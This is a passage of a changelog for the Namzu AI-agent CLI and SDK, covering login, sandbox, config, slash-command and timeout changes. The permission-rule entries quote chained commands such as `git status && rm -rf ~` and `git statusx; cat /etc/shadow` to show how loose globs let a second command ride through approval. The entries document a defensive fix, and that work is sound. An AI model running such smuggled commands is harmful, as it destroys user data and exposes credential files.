  menu has committed, preventing a key repeat from applying the first choice
  before the operator can see it.

### Patch Changes

- aedd9f8: Bound live tool progress under host backpressure. `ToolContext.report()` now
  keeps at most one in-flight and one latest pending update per call, caps each
  published message at 8 KiB of UTF-8, and settles accepted progress before the
  terminal event without changing the durable tool result. The interactive CLI
  shows that latest progress and optional percentage on the matching live tool
  row with terminal-safe rendering.
- b3a3665: Bound recalled prompt rendering so large history entries cannot exhaust terminal layout work while their complete source remains editable and is resubmitted unchanged.
- 90deea2: Recover a server-confirmed invalid-image request once when the provider-bound
  history contains exactly one distinct image. HTTP 400 responses carrying the
  exact `invalid_image` provider code preserve the original bytes with durable
  `modelOmission` metadata after a successful image-free retry, suppress that
  image on later requests, and emit a measured history-repair event. A legacy
  phrase can recover the current request but cannot claim durable server proof;
  failed, ambiguous, partial-output, and cancelled attempts leave history unchanged.

  SDK consumers that exhaustively switch over
  `message_history_repaired.source` must handle the new
  `provider-rejected-image` member. Persistence implementations must retain the
  optional `modelOmission` field on image attachments and image tool-result
  blocks. `ProviderErrorInfo.providerCode` is now the bounded machine identifier
  from a provider error response; do not parse `detail` for provider-defined
  codes. Hosts should render the repair as retained bytes with model delivery
  suppressed, not as deletion.

- 1643672: Add `runtime-context` to `UserMessageSource` and tag SDK-authored user-role
  messages with the reason they were inserted. Consumers that exhaustively switch
  over `UserMessageSource` must handle the new member; persistence layers must
  preserve it instead of reclassifying the message as operator input.

  The CLI now renders, edits, resumes, validates and exports these durable messages
  as runtime context rather than as text typed by the operator.

- e69e881: Keep packaged TUI installs on the renderer versions exercised by Namzu's PTY
  suite, preventing subscription login from allocating an unbounded terminal
  frame after dependency resolution. `/login` now separates reusable Claude and
  Codex device sessions from new Namzu-owned sign-ins, and reports when the host
  has no browser launcher instead of claiming one opened.
- Updated dependencies [343730a]
- Updated dependencies [aedd9f8]
- Updated dependencies [90deea2]
- Updated dependencies [1643672]
- Updated dependencies [645b9db]
  - @namzu/sdk@32.0.0
  - @namzu/anthropic@4.0.1
  - @namzu/ollama@2.2.1
  - @namzu/openai@1.5.0
  - @namzu/openrouter@2.3.1

## 14.2.1

### Patch Changes

- 9e1c9a3: Repair Claude subscription sign-in by matching the current registered browser request, letting the provider picker accept its returned authorization code, and preserving the subscription-routing identity on model requests. Print the TUI banner once during boot and keep the permanent idle key legend out of the footer while preserving state-specific interaction hints.
- Updated dependencies [9e1c9a3]
  - @namzu/anthropic@4.0.1

## 14.2.0

### Minor Changes

- 5452bfc: Reuse Claude and Codex subscription sessions from a paired Windows home under WSL, refresh a rotating Claude grant back into its exact owner envelope, and align new Claude sign-in with the direct subscription OAuth flow instead of API-usage billing. Bare `/effort` and `/permissions` now open finite keyboard choosers, while the footer keeps model, effort, working directory and durable goal state visible. Argument forms and API-key authentication remain available.

## 14.1.0

### Minor Changes

- e28f7dc: Let `/copy` choose the whole latest assistant response, an exact fenced-code body,
  or an exact prose blockquote. The picker stays anchored to the response it opened
  with and holds queued work until the operator selects or cancels it.
- 77242a0: Expose optional per-model input modalities through `ModelInfo`, add inline image input for DeepSeek's vision preview while refusing images on text models and documents on every DeepSeek model, and label models whose listing explicitly advertises image input in the CLI picker.
- cc9917b: Reuse a sole signed-in Claude or Codex subscription automatically on first run,
  ask only between those subscriptions when both exist, and keep the Claude/Codex
  Namzu sign-in choice reachable when an optional API key was also detected.

### Patch Changes

- Updated dependencies [77242a0]
  - @namzu/sdk@31.1.0
  - @namzu/deepseek@1.1.0

## 14.0.0

### Major Changes

- 09141a8: Reuse usable Claude and Codex device sessions before asking for a new credential, add a selectable Namzu-owned login for both subscriptions, and keep API keys optional. Bare `namzu login` no longer starts Claude implicitly; run `namzu login claude` or `namzu login codex`, or choose the provider from the interactive `/login` screen.

  Add the account-routed `CodexProvider` and `registerCodex()` Responses transport to `@namzu/openai`. Hosts supply a user-authorized access token and ChatGPT account id, and remain responsible for discovery, refresh and persistence.

### Patch Changes

- Updated dependencies [09141a8]
  - @namzu/openai@1.5.0

## 13.0.0

### Major Changes

- f3bf47b: Require every `PluginLifecycleManager` host to provide project and user
  `scopeRoots`. Plugin installation now canonicalizes a candidate against that
  declared filesystem authority, refuses symlinked or non-regular plugin
  manifests, and keeps executable admission and lifecycle ownership private to
  the manager instead of trusting mutable `PluginRegistry` records.

  Hosts constructing the SDK manager must pass
  `scopeRoots: { project: trustedWorkingDirectory, user: userHomeDirectory }`.
  Move plugins under the matching root instead of relying on a symlink or an
  out-of-scope registry record. The CLI applies those roots automatically and no
  longer loads project or user plugins through links that leave the admitted
  scope.

- fd5fcea: Bound sandbox lifecycle ownership across run cancellation and teardown.

  Sandbox creation now receives run cancellation and the run's remaining wall-clock timeout, cannot publish a handle after either boundary wins, and releases any handle that arrives late. A setup that ignores its signal therefore settles the run with `stopReason: 'timeout'` instead of pinning it forever. Teardown receives a fresh signal and waits for 30 seconds by default without allowing an implementation that ignores cancellation to pin the run. Set `sandboxTeardownTimeoutMs: 0` on SDK runs or agents to retain the former unbounded teardown wait. Custom providers should honor `SandboxCreateConfig.signal` and `SandboxDestroyOptions.signal`; remote allocation protocols still need a client-owned reconciliation key or fleet reaper for a resource committed behind a lost response.

  The CLI exposes the same compatibility control as `sandbox.teardownTimeoutMs` and carries it to live turns, delegated child agents, and durable resumes. Children and resumed runs now use the session's sandbox provider instead of silently executing through the host boundary; set `sandbox.enabled: false` only when host execution is intentional.

- d5ccf03: Change `/clear` to start a new resumable conversation context as well as clearing the terminal. Use `/clear-screen` to retain the previous screen-only behavior. Add `/new` to start the same fresh context without clearing visible scrollback.
- 08f89c5: Refuse explicit invalid values for known configuration keys instead of silently substituting a default, lower-precedence value, or disabled feature.

  `loadConfig` and `loadConfigWithProvenance` now validate user, project and managed files, every declared profile body, and explicit `NAMZU_FORMAT` / `NAMZU_QUIET` values. A semantic failure throws the exported `ConfigValueError`, which names the source and exact setting path. The CLI maps it to `EX_CONFIG` (78); an invalid `--format` is rejected as command-line usage (64) before the command runs. Unknown keys remain non-strict and permission/MCP entries retain their existing per-entry diagnostics.

  Profile selection now uses own-property semantics, so inherited object names such as `toString`, `constructor`, and `__proto__` are not treated as declared profiles. A literal own profile with any of those names remains selectable.

  **What breaks:** callers that previously received a fallback config from a known invalid file, profile, or environment value now receive `ConfigValueError`; scripts passing an unsupported `--format` no longer run in text mode. Fix the named value or remove it, and unset an environment variable rather than setting it to an empty string when no override is intended.

- 79faa99: Add a host-owned live project-instruction context to the SDK. Queries and all
  agent front doors can rebuild a retained snapshot before the first provider
  request, observe completed top-level and nested registry executions, and
  durably replace that snapshot after a complete tool batch without creating a
  human continuation. Callbacks receive the run cancellation signal and accepted
  message prefix; each returned snapshot is committed before the next observation
  begins, so cancellation retains accepted policy state while rejecting an
  unfinished suffix. Project-instruction messages carry bounded canonical
  project-relative `AGENTS.md` provenance and survive compaction.

  BREAKING: the CLI now represents repository instructions as scoped, retained
  conversation context instead of a frozen system-prompt block. Hosts that inspect
  raw provider messages or persisted session history must handle the
  `project-instructions` user-message source. This lets nested instructions take
  effect during the session and lets reconstruction re-read current disk content
  instead of replaying stale policy prose.

- ee48cb0: A `[permissions]` rule about `bash` decides the commands the line runs

  An operator's table compiled to a pattern matched against the serialised tool
  input, and two loosenesses came with that subject. The rule could match the
  start of any argument's value rather than the one they meant, and the match
  stayed open on the right — so `bash = { "git status*" = "allow" }` also approved
  `git status && rm -rf ~` and `git statusx; cat /etc/shadow`. The
  dangerous-pattern floor does not cover either: it is four patterns about
  catastrophic commands and says nothing about reading a credential file.

  A tool that declares which of its arguments holds a command line — `bash` does —
  is now compiled through the kernel's `argument_pattern`, whose subject is that
  argument's own value read as the commands it runs. Chain operators, subshell
  grouping and a nested `sh -c` payload are read; quoting is respected.

  The asymmetry the compiler already had is carried over, because the reasons for
  it did not change:

  - An `allow` anchors, and now anchors **per command**: every command on the line
    must match, or the call falls through to being asked.
  - A `deny` stays loose, and now also sees a command riding behind a separator:
    `"git push*": "deny"` refuses `true; git push`, and `"rm -rf*": "deny"` still
    refuses `sudo rm -rf /`.

  **What breaks.** A table that relied on either looseness stops approving what it
  used to. `"git status*": "allow"` no longer covers `git status && anything`;
  `"*git status*": "allow"` still loosens the match within one command and no
  longer reaches across commands. To approve every call to a tool, write
  `"*": "allow"`, which now compiles to a by-name rule rather than to a pattern —
  "every call" cannot be expressed as a pattern about an argument that a call
  might not carry.

  Tools that declare no command argument — MCP servers, host tools, `edit`,
  `read` — compile exactly as before.

### Minor Changes

- 74705e2: Add `/compact`, which shrinks a conversation when you ask rather than when a threshold decides.

  The machinery already existed — `compactNow` is exported from `@namzu/sdk` and its comment says it is "compaction a host can ASK for" — and no host asked. A long session could only be compacted by crossing a token threshold mid-turn, which is the moment you least want a model call, or by clearing it and losing everything.

  `/compact` summarises the older half and keeps the recent turns. What it does with the transcript is the part worth knowing: the transcript is **trimmed** to the surviving turns rather than rebuilt from the returned messages. The two are not the same list — the transcript also holds tool rows, per-tool glyphs and collapsed bodies the model never saw, and rebuilding would produce a correct conversation while erasing how the surviving turns looked. Tool rows belonging to a kept turn stay with it, because an answer on screen with no visible cause is worse than a longer transcript.

  A conversation too short to shed anything says so instead of reporting a compaction that did not happen, and the summary is attached to the row as collapsible detail — it is what the model reads from here on, so it has to be inspectable.

  `CompactNowInput` and `CompactionResult` are now exported from `@namzu/sdk`. `compactNow` was on the public surface and its parameter and return types were not, so the first host to call it had to inline the shapes.

- 2318422: Config profiles, and a machine-wide file that wins the cascade

  **Profiles.** A named bundle of settings _inside_ a config file, so the settings
  you switch between sit next to each other and can be read as a set — which a
  second config file cannot give you, because a second file has to be found before
  it can be compared.

  ```json
  {
    "permissions": { "bash": "ask" },
    "profiles": {
      "ci": { "quiet": true, "permissions": { "bash": "allow" } },
      "review": { "permissions": { "bash": "deny", "read": "allow" } }
    }
  }
  ```

  Select with `--profile ci` or `NAMZU_PROFILE=ci`; the flag wins, because a flag
  is this run and a variable is this shell. A profile overrides the base values of
  the file it was declared in — otherwise selecting it could not change anything —
  and loses to the environment, so a variable set for one shell keeps working
  after somebody picks a profile.

  The same name may appear in both config files. Each is applied as its own layer
  in the usual file order, so the project's wins _and_ `ConfigProvenance` still
  names the file each value actually came from; one merged layer would report both
  as "the profile" and send an operator to the wrong file. A profile may set
  anything except `profiles`.

  **A name no file declares is refused, not ignored**, with the declared names and
  the files that declare them in the message. Ignoring it means running under
  settings nobody chose and reporting success.

  **The managed file.** `/etc/namzu/config.json` (`%ProgramData%\namzu\config.json`
  on Windows) is read last and beats the project file and the environment both —
  the only ordering that makes such a layer worth having. It exists for the case
  where the person running namzu is not the person deciding what it may do.

  Its guarantee is the file system's and nothing more: no signature is verified,
  no owner is checked, and namzu cannot tell an administrator's file from one a
  user wrote there. What stops a user editing it is that the path needs privileges
  they do not have. It is absent on almost every machine, which is expected.

  `ConfigSource` gains `profile` and `managed` variants. A host switching on it
  exhaustively will need the two new arms.

- 7576054: Add `/debug-config`, a values-free view of the winning source for every resolved configuration key.

  The command identifies defaults, user and project files, selected profiles, environment variables, the managed file, and exact `--format` or `--quiet` overrides. It retains the selected profile even when higher-precedence layers replace all of that profile's values.

  Dynamic source metadata is credential-redacted and emitted only as quoted printable ASCII with visible escapes for control, bidirectional-formatting and non-ASCII code points.

- a4ba972: Add `/diff`, which shows what is uncommitted in the working tree.

  There was no in-session way to see what had changed. The answer was another terminal, and an operator who did not switch to one accepted a turn's work without reading it.

  **It reports the working tree, and says so on every non-empty answer.** The obvious framing — "what this session changed" — is one the CLI cannot honestly make: the tool events carry a human-readable summary rather than a path, and parsing a path back out of prose would be a guess dressed as attribution. So the command answers the question it can answer and names it accurately, rather than answering a better-sounding one wrongly.

  Two things it refuses to get wrong. A directory that is not a repository produces an empty diff from any naive implementation, and an empty diff reads as _working tree clean_ — a claim about a repository that does not exist; this says it cannot tell. And `git diff` shows no untracked file at all, so a session whose entire output is new files would otherwise report changing nothing; untracked paths are listed separately.

  The patch goes in the collapsible body with a byte cap, because a transcript is not a pager and a diff that scrolls the session away has answered by making the answer unreadable.

- 3e27578: Edit a previous user prompt on a source-preserving conversation branch with Esc
  twice from an empty composer.

  The prompt picker forks immediately before the selected user message, restores
  its readable text and every durable attachment into the composer, and keeps the
  original conversation unchanged. Editing the first prompt creates an
  empty-prefix branch. Selection is compare-and-swap guarded against durable
  history so a stale picker cannot branch at a different boundary.

- a33c696: Add a default-off `plugins` configuration for trusted project and user plugin
  discovery. Enabled CLI sessions now install SDK plugin tools, hooks, skills and
  stdio MCP servers across interactive, headless, durable-resume and ACP entry
  points, and own rollback and teardown of those contributions. Plugin authority
  must come from a config file; environment-selected profiles cannot enable it.
- 94d3306: Add the chain-aware `reasoningEffortLevelsFor(model, thinking)` provider capability while retaining `effortLevelsFor` as a deprecated compatibility member. The four capability states now distinguish a driver with no menu, an unknown model, an explicitly unsupported model, and an exact selectable set; fallback chains expose only levels every reachable member accepts.

  The TUI adds session-scoped `/effort [level|default]`, sends the selection to later main-query turns, and resets it atomically when a provider/model replacement succeeds. Failed or cancelled replacements preserve the current selection.

  OpenAI publishes exact known-model menus and keeps unknown compatible-endpoint models unknown. DeepSeek explicitly publishes no supported levels. Anthropic now refuses unsupported effort levels before transport instead of silently dropping them; callers upgrading Anthropic must choose a level returned by `reasoningEffortLevelsFor()` or omit `effort` to retain the provider default.

- bad2c20: Make new conversation forks exportable by atomically publishing and verifying their copied model context before recording an immutable source-turn boundary. Nested forks flatten that boundary, later source turns cannot leak into it, and ambiguous or legacy prefixes remain explicitly unexportable.
- 75eb7a1: Add `/mcp`, which shows which tool servers connected, what each exposes, and which failed.

  The facts were reported once, at connect time, as transcript rows that scroll away. Ten minutes into a session there was no way to ask again — and a server that failed to start is, from the operator's seat, indistinguishable from one nobody configured. That is exactly the state they are in when a tool they expected is simply not there.

  Failures are listed as prominently as successes and never omitted, because a page that showed only what worked would look correct and complete on a machine where nothing did. "No session yet" and "no servers configured" are reported as the different facts they are.

  Tools are **named**, not counted. A count answers "did it connect"; the operator's actual question is whether the tool they wanted is among them. The names are carried from the listing at connect time rather than recovered afterwards by splitting the `mcp_<server>_` prefix apart — that prefix is an encoding `integrations/mcp/servers.ts` owns, and recovering it elsewhere would make it a format two places have to agree about.

- ac05c1c: `permissionChecks`: state what your permission table decides, and have it checked

  A `[permissions]` table is a set of globs compiled to regular expressions and
  matched against a subject the operator never sees. Every stage of that has been
  wrong at least once, and each time the failure was silent and permissive — a
  rule that read like a prohibition and decided nothing, an `allow` whose match
  began wherever the text did, a glob whose trailing star reached past the end of
  a command. The config looked right in every case, and nothing an operator could
  run would have told them otherwise.

  A new optional `permissionChecks` array states the decision the operator
  believes their table produces, and every entry is evaluated against the compiled
  table at startup:

  ```json
  "permissionChecks": [
    { "tool": "bash", "input": { "command": "git status --short" }, "expect": "allow" },
    { "tool": "bash", "input": { "command": "git status && rm -rf ~" }, "expect": "ask" }
  ]
  ```

  The second is the point: it asserts a NEGATIVE — that a rule does not stretch to
  cover a command nobody named — which is exactly what a table of globs cannot be
  read for.

  A mismatch is reported by index with the decision it got, the one expected, and
  the rule that decided; the run continues, because a wrong expectation should
  cost that line and not the whole policy. A check that cannot be read is reported
  rather than skipped. The dangerous-pattern floor is off while checking, so a
  check written about the table cannot be answered by something the table does not
  contain — and cannot keep passing after the rule it was written for is deleted.

  Not settable from the environment: a variable that could replace the checks
  could also empty them.

- 04d5801: Add `/raw [on|off]`, a copy-friendly transcript mode that replays retained
  scrollback as literal Markdown source and complete plain tool output without
  changing conversation context or persistence.
- 7ed1d5e: Add `/review`, which asks the agent to review the uncommitted work.

  It rests on `/diff`: the same reading of the working tree, turned into a turn.

  The whole command is really its prompt, because a review turn fails in two opposite directions and both read as success. It can **invent** problems — worse than no review, since somebody acts on the finding — so the instruction requires each one to name a file, a line, and the input or state that produces the wrong behaviour, and to be withheld otherwise. And it can **reassure**, or restate the diff back, which is what a model produces when it has nothing to say; so summarising is refused outright and answering "this looks right" in one line is explicitly allowed. Without an approved way to report nothing, the only available answer is to find something.

  The file list is sent, not the patch. The agent has a shell and can read what it wants; pasting in a truncated patch would spend the context that reading the interesting parts properly requires, and a review of a truncated diff is a review of whatever fitted.

  Over a clean tree it refuses rather than sending the turn — a review of nothing comes back reading exactly like a review of something.

- b1b240b: Allow an interactive session to inspect and select `prompt`, `auto`, or `strict`
  tool-review behavior with `/permissions`. Changing mode at an idle boundary now
  revokes an earlier approve-all choice, and a session launched with `--yolo` can
  be narrowed back to prompting without rebuilding the session.
- 143b8d9: Add session-owned durable completion goals, direct `/goal` operator control,
  and race-fenced automatic continuation.

  SDK consumers can persist, inspect, and transition a `SessionGoal` through
  tenant-authorized in-memory or disk stores with exact revision checks. CLI
  operators can create, inspect, edit, pause, resume, and clear the goal belonging
  to the active durable conversation without sending those commands to the model.

  The SDK also exposes atomic admitted-round accounting, finite caps,
  process-local activation, host provenance for goal-sourced user messages, and
  run-scoped goal tools. The CLI drives those primitives only at a durable idle
  boundary, keeps human prompts ahead across admission races, withholds goal tools
  from ordinary and child runs, disarms on abnormal or non-durable settlement,
  and preserves automatic-turn attribution through resume and verified export.

- 4491a23: Add `/status`, which shows where a run may write and when it stops to ask, on one page.

  Both facts were already there and neither was findable next to the other. The sandbox arrives as a boot notice that scrolls away; the approval settings answer to `/permissions`. They are separate mechanisms answering separate questions, and neither implies the other — turning approvals off widens no sandbox, and confining the filesystem stops no prompt. Read apart, each looks like the whole answer, which is exactly how an operator ends up believing they configured something they did not.

  `/status` prints them adjacently, each labelled with the question it answers rather than with its mechanism's name, along with the provider, model and spend.

  Two things it refuses to smooth over. A tier that enforces nothing is reported as **not confined** rather than as a weaker sandbox, because it is the absence of one. And what the config _demanded_ is printed separately from what the host _happens_ to supply: those read identically on a machine that supplies it anyway, and only the demand still holds on the next machine.

  `ResolvedSandbox` gained the structured facts behind its notice (`environment`, `enforced`, `required`), and `AgentSession` carries a `SandboxSummary` so a caller reads the sandbox the run is actually using rather than resolving a second one.

- 043b8ba: Add `/copy`, which sends the latest available raw assistant output to the terminal clipboard through a bounded OSC 52 request.

  While another turn is streaming, the previous normally completed answer remains the target. Partial or abnormal completions do not replace it, `/clear` and `/compact` preserve it, and `/resume` selects the newest persisted assistant output in the resumed conversation.

  The command refuses non-interactive terminals and output above 100,000 UTF-8 bytes without truncating. Because OSC 52 cannot acknowledge clipboard acceptance, the UI reports that a request was sent and warns that terminal policy may ignore it instead of claiming the clipboard changed.

- 0131939: Add opt-in, content-free terminal notifications to the interactive UI.

  Configure `tui.notifications` as `true` for both supported moments or as a list
  containing `turn-settled`, `approval-required`, or both. Notifications remain
  off when the setting is absent. `tui.notificationMethod` selects `osc9` (the
  default) or `bel`.

  Approval is signalled only when the prompt actually opens. Turn settlement is
  signalled only after immediately queued work is exhausted; manual interruption
  and an abandoned turn from a resumed conversation do not produce late or
  duplicate notices. Fixed notification text carries no conversation or tool
  content, and no host command is started.

  The terminal protocols do not acknowledge display or sound. A successful write
  therefore means only that the request was sent and may still be ignored by the
  terminal or an intermediate session.

- 0d8e19a: `/title` and `/fork`: name a conversation, and branch one

  `/resume` listed every conversation by the first thing typed in it. That is a
  reasonable default and a poor identity — it stops describing the work as soon as
  the work moves on from its opening question, and two conversations that began
  the same way are one row twice.

  `/title <name>` fixes a name in place; bare `/title` reports the current one, and
  `/title clear` goes back to the derived one. Bare `/title` deliberately asks
  rather than clears: a name erased by an early enter is a loss nobody notices
  until the next `/resume`. Named rows are shown in quotes, because a chosen name
  keeps meaning what it meant and a derived one does not, and without the mark the
  list reads as if every row were chosen.

  `/fork` continues in a copy and leaves the original where it is: the transcript
  on screen carries over, the next turn is written to the copy, and the original
  is unchanged and still resumable. The copy is a real session with the transcript
  written into it rather than a pointer, so the two diverge from the fork point.

  It is always named — `… (fork)`, then `… (fork 2)` — and that is load-bearing
  rather than cosmetic: a fork and its original share every message they have, so
  both derive the same title, and `/resume` would show two rows a person cannot
  tell apart in the list they would use to undo the fork.

  `/fork` is refused while a turn is running. Interrupting the way `/resume` does
  would be wrong here: `/resume` leaves a conversation, so an interrupted reply
  landing in the one being left belongs there — a fork stays, and the copy would
  be missing the last thing the operator watched arrive.

  Names live in `.namzu/titles.json` beside the sessions rather than on the SDK's
  `Session`: nothing in the kernel would read one, and putting it in the entity
  would widen a store interface every host implements to carry a string only the
  CLI writes and displays.

  `RecentConversation` gains a `named: boolean`. A host rendering its own picker
  should show the two kinds differently.

- c6ebb31: Add `/export [path]` to write a no-clobber Markdown conversation from durable CLI turn bindings and event-head-verified SDK run evidence. Legacy conversations and unresolved fork prefixes refuse instead of producing a partial file.

  Add `ReadRunEventsOptions.integrity`. The default `tolerant` mode retains the existing damaged-line skip behavior; `strict` refuses torn, malformed, or discontinuously numbered event logs for callers that need a completeness proof.

### Patch Changes

- 45d7014: Preserve complete SDK messages supplied to stateless `run-stream` on stdin, including opaque reasoning, attachments, citations, and tool exchanges. Malformed or provider-incomplete history now refuses before a run instead of silently continuing with dropped context.
- 753b037: Make disk-backed memory reads and mutations fail closed on incomplete,
  malformed, unsafe, or uncommitted durable state.

  Indexed content is now validated before it is returned or updated. Missing
  content, invalid JSON, newer schemas, mismatched IDs, invalid field shapes,
  unsafe filename IDs, and content directories resolving outside the memory
  root refuse the operation instead of becoming a false not-found or success.

  Disk-memory operations sharing one canonical index path are serialized within
  the SDK process and reload the authoritative index before acting. Concurrent
  CLI parent/delegate saves no longer lose all but the last record, warmed
  readers observe sibling writes, and create/update/delete publish live state
  only after their required durable operations succeed. Cross-process writers
  still require a single owner or storage-level conditional publication.

- 3c61c94: Make manual compaction the conversation history used after the command, not only a transcript notice.

  The CLI now sends the compaction summary on the next turn and restores the same compacted history through `/resume`. It waits for pending turn writes before atomically replacing the durable conversation projection, refuses to compact an active turn, and pauses input while the snapshot is owned. Expanded file mentions and image attachments also remain in later model requests instead of being rebuilt from their lossy transcript rows. `/clear` continues to clear only the visible transcript.

  The SDK adds optional `SessionStore.replaceMessages` support to its memory and disk stores. The disk implementation keeps the physical message log append-only by writing one replacement record, then projects later reads from it. `isCompactionMessage` is now exported for hosts that restore summary rows in their own views.

- 99127d8: Expose unsupported document inputs through the public `capability_warning` run event before provider settlement. Consumers handling that event must accept the new `documents` capability value.

  Render provider capability warnings in the interactive transcript, and pause already-queued follow-ups after a failed or abnormally stopped human turn until the operator submits a continuation or successfully changes provider/model.

- 63ec53b: Prevent `/fork` and `/compact` from reading stale conversation history after an
  interrupted turn.

  The terminal becomes interactive as soon as an interrupt is requested, while a
  provider iterator may still be unwinding and may not yet have attached its
  partial reply to the durable-write queue. History operations now distinguish
  that settlement interval from UI idleness. `/fork` waits for every write already
  attached to the queue before copying, and pauses new input while it takes the
  snapshot.

- 2d16ca2: Isolate every live agent-client protocol session by identity, working
  directory, cancellation and exact provider history.

  **What breaks in the SDK:** one ACP session now permits only one unsettled
  prompt, and session working directories must be absolute. Hosts that submitted
  overlapping prompts under one id must wait, cancel, or use distinct sessions;
  hosts that passed a relative `cwd` must resolve it first. Session creation and
  loading also share one collision-refusing namespace, so loading or generating
  an already open id no longer replaces its live record.

  Gateways may return the settled conversation beside the stop reason so the next
  prompt receives exact replay state. The CLI drives that seam with one runtime
  session per wire id, activates trusted target config only at the first prompt,
  routes events and permissions to the owning id, and closes late or connection-
  owned sessions on teardown. Cancelling during lazy runtime construction now
  settles the wire prompt immediately while retaining ownership of, and later
  closing, any session candidate that arrives after cancellation.

- 5380e6f: Preserve the kernel's exact model-visible conversation across interactive and persisted streaming turns, including opaque reasoning, citations, and complete tool sequences. Fresh per-run system prompts remain out of durable history, and opaque state no longer has to be reconstructed from rendered assistant text.
- 15f8ee4: Bound provider stream silence, including query-owned advisory calls and
  RouterAgent routing decisions, compaction verifiers and model-graded eval
  judges, to five minutes by default and abort the stalled provider transport,
  with network-classified retry and fallback recovery where those policies
  apply. This changes the previous default, under which a provider iterator could
  remain silent forever. Set `streamIdleTimeoutMs: 0` on the run, agent, manual
  compaction, verifier, or judge config to keep the old unbounded behavior, or set
  a positive millisecond value to choose a different bound.

  Queries whose caller signal is already aborted now settle as cancelled before
  starting provider, provider-metadata, or tool work. A later cancellation also
  settles while an optional context-window resolver remains pending, even when
  that resolver ignores its signal. With no caller cancellation, `timeoutMs`
  bounds the optional metadata lookup, aborts its private transport signal, and
  falls back to the static context-window table instead of blocking the run.

  The OpenRouter context-window lookup now forwards cancellation to its model-list
  transport. Only fulfilled listings are cached, so cancelling one concurrent
  query cannot abort another query's shared metadata request or force that query
  onto the static context-window table.

  `runExperiment({ timeoutMs })` now applies one validated wall-clock deadline to
  both case execution and scoring. Scorers receive its optional cancellation
  signal; a non-cooperative scorer is detached, and `judgeScorer` forwards the
  signal to its bounded provider transport. Values outside the positive platform
  timer range are refused before a case starts; omit the field for the prior
  unbounded case behavior.

  Compaction verification inside a query now carries the run cancellation cause
  to its provider transport without placing a second idle timer around retry and
  fallback. Public `buildVerifiedSummary`, `compactNow`, and `compactRegion`
  calls bound raw provider silence themselves and accept optional `signal` and
  `streamIdleTimeoutMs`; malformed values and pre-cancelled manual work are
  refused before provider work or a no-op result.

  HTTP embedding batches now have a 30-second whole-request default, including
  response-body reads, where the previous default could wait forever. Set
  `requestTimeoutMs: 0` on `HttpEmbeddingProvider` to keep the former unbounded
  behavior. Invalid timeout values and non-positive or fractional `batchSize`
  or `dimensions` values are refused at construction instead of silently
  disabling the bound or entering a non-progressing batch loop. Successful HTTP
  responses must contain exactly one unique, in-range result per input and finite
  vectors of the configured dimension; malformed or incomplete batches are
  refused atomically instead of reaching ingestion with missing embeddings.

  Public RAG operations accept optional cancellation context. The shipped
  `knowledge_search` tool forwards its run-owned signal through
  `KnowledgeBase`, retrieval or ingestion, and the embedding provider. The HTTP
  provider preserves the caller's exact cancellation reason while aborting only
  its private fetch transport. Custom embedding providers receive the signal as
  a cooperative request; callers still own their wait boundary if a custom
  implementation ignores it. Default retrieval and ingestion recheck authority
  after that custom call settles, so a late result cannot start a vector search
  or persist chunks after cancellation. `VectorStore.search` and `upsert` now
  receive the same optional operation context. The default pipelines also race
  those store promises against cancellation, so a non-cooperative custom store
  cannot leave the public query or ingestion call pending forever.

  A2A agent-card discovery now has a 30-second whole fetch-and-body default and
  accepts an optional caller signal and `timeoutMs`; set `timeoutMs: 0` to retain
  the former unbounded behavior. `A2ADelegate.timeoutMs` now starts before
  `message/send` and bounds the whole delegation instead of polling only. A
  pre-cancelled dispatch starts no remote work, pending fetch and body promises
  cannot hold `waitForTask`, and caller cancellation preserves its exact cause on
  the private transport. Poll and delegation timers are validated at
  construction. Once a safe task id exists, cancellation or timeout sends one
  independently bounded `tasks/cancel`; during initial task creation the client
  keeps a short cleanup grace and explicitly reports an unknown remote outcome if
  the peer never returns an addressable id. Poll replies are bound to that initial
  id, and transport or protocol failures after it is known make the same bounded
  cleanup attempt before the original failure is returned. An `input-required`
  task is also bounded-cancelled before the delegate reports that it cannot
  supply the requested input.

  Connector execution now carries optional operation authority through the
  manager, every connector-tool adapter, real query runs, tenant/environment
  facades, health checks, and `MCPConnectorBridge.callTool`. Custom connectors
  receive the signal; if they ignore it, the manager settles with an honest
  unknown remote outcome and rejects a late success that does not identify a
  received response. A tenant call cancelled before admission no longer spends a
  rate-limit slot.

  `HttpConnector` and `WebhookConnector` now apply one validated 30-second
  fetch-and-body deadline and a streaming 2 MiB response limit by default. Set
  positive `timeoutMs` and `maxResponseBytes` values to choose different bounds.
  Cancellation, deadline, or response-size failure aborts only the private
  transport/body reader and preserves the caller's exact cause. Result metadata
  distinguishes `not_started`, `unknown`, and `response_received`, includes retry
  safety, and keeps a received status visible when its body is unavailable.

  Dynamic HTTP paths and webhook URL overrides must remain on the configured
  origin. Model-authored routing headers are refused, redirects are not followed,
  and 3xx responses are no longer reported as success. Configure a separate
  connector instance for each authorized origin; callers that previously used a
  cross-origin webhook override must migrate to that instance.

  `GuardedFetchProvider` now applies one validated 30-second deadline across DNS
  resolution, every manually admitted redirect fetch, and the final response
  body, while preserving a caller's exact cancellation cause on a private
  transport signal. Its 2 MiB default response cap is enforced from streamed
  bytes rather than after `response.text()` allocates the whole body; overflow
  cancels the reader and returns a valid UTF-8 prefix. Redirect bodies are
  cancelled when abandoned, and a spent redirect budget causes no DNS lookup for
  the next target. Set positive `timeoutMs` and `maxBytes` values or a
  non-negative integer `maxRedirects` to choose other bounds. Custom
  `GuardedFetchConfig.resolve` functions may now accept the operation signal as
  a second argument. IPv4-mapped IPv6 literals are canonicalized back to their
  IPv4 address before range checks, closing the hexadecimal mapped loopback and
  link-local bypass; the full IPv6 link-local and multicast ranges are also
  refused.

  MCP request methods now accept optional cancellation authority, and generated
  MCP tool and prompt adapters forward the run-owned tool signal. A pre-aborted
  request starts no transport work; a pending request preserves the caller's
  exact cause, aborts a private transport, removes its correlated pending id, and
  makes a one-second best-effort `notifications/cancelled` attempt. The
  notification does not prove that an already-started remote side effect stopped.
  Paged list calls recheck the same signal before each page.

  `MCPClient.requestTimeoutMs` and HTTP MCP transport `timeoutMs` values must now
  be positive platform-range integers. A shorter transport deadline remains a
  request-timeout terminal and emits the same correlated cancellation. HTTP
  fetches and response-body reads share operation authority; disconnect owns
  active requests and cancellation cleanup. Reconnects fence late POST responses
  and SSE batches from prior generations, clear Streamable session state, and
  accept session ids only from successful `initialize` responses. Per-send
  failure no longer marks a Streamable client connection-wide errored or rejects
  unrelated concurrent calls. `MCPTransport.send` now accepts optional
  `MCPTransportSendOptions`; custom transports should refuse pre-aborted work and
  stop their per-send I/O when its signal fires.

  Provider model listings and credential probes now accept optional cancellation
  signals. Retry, fallback, stream-idle and instrumentation decorators preserve
  that authority, and every bundled CLI driver forwards it to the underlying
